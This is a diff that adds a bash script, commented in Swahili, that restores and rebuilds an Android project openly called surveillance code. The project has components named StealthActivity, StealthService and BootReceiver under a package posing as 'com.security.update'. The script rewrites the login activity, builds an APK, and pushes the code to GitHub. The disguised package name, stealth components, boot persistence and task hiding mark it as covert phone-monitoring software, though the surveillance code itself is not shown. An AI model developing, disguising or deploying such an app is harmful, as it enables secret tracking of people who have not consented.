@@ -1,3 +1,39 @@
+#!/bin/bash
+cd ~/android-surveillance-final2
+
+echo "🔄 KUIRUDISHA CODE YA SURVEILLANCE..."
+echo "==================================="
+
+# 1. Angalia kama code ya surveillance ipo
+echo "🔍 Checking surveillance code..."
+
+# 2. Hakikisha files zote muhimu ziko na zina content
+SURVEILLANCE_FILES=(
+    "LoginActivity.java"
+    "StealthActivity.java"
+    "StealthService.java" 
+    "BootReceiver.java"
+)
+
+for file in "${SURVEILLANCE_FILES[@]}"; do
+    filepath="app/src/main/java/com/security/update/$file"
+    if [ -f "$filepath" ]; then
+        lines=$(wc -l < "$filepath")
+        if [ "$lines" -lt 10 ]; then
+            echo "⚠️  $file is too small ($lines lines) - needs proper code"
+        else
+            echo "✅ $file has proper code ($lines lines)"
+        fi
+    else
+        echo "❌ $file is missing!"
+    fi
+done
+
+echo ""
+echo "📝 RESTORING PROPER SURVEILLANCE CODE..."
+
+# 3. Hakikisha LoginActivity ina code ya parent code verification
+cat > app/src/main/java/com/security/update/LoginActivity.java << 'LOGIN_ACTIVITY'
 package com.security.update;
 
 import android.Manifest;
@@ -189,3 +225,36 @@ public class LoginActivity extends AppCompatActivity {
         moveTaskToBack(true);
     }
 }
+LOGIN_ACTIVITY
+
+echo "✅ LoginActivity code restored!"
+
+# 4. Build tena na kuangalia ukubwa
+echo ""
+echo "🔨 Building with proper surveillance code..."
+./gradlew clean
+./gradlew assembleDebug --no-daemon
+
+if [ -f "app/build/outputs/apk/debug/app-debug.apk" ]; then
+    echo ""
+    echo "📊 NEW APK SIZE: $(du -h app/build/outputs/apk/debug/app-debug.apk | cut -f1)"
+    echo "🎉 Sasa APK inapaswa kuwa na ukubwa sahihi!"
+    
+    # Copy for testing
+    cp app/build/outputs/apk/debug/app-debug.apk ./SURVEILLANCE_PROPER.apk
+    echo "📱 Test APK: SURVEILLANCE_PROPER.apk"
+else
+    echo "❌ Build failed"
+fi
+
+echo ""
+echo "📤 Pushing proper surveillance code to GitHub..."
+git add .
+git commit -m "🔧 Restore proper surveillance code
+- Fixed LoginActivity with complete parent code verification
+- Added proper permissions handling
+- APK should now have correct size"
+git push origin main
+
+echo ""
+echo "✅ PROPER CODE PUSHED! Sasa GitHub Actions itatengeneza APK ya ukubwa sahihi."
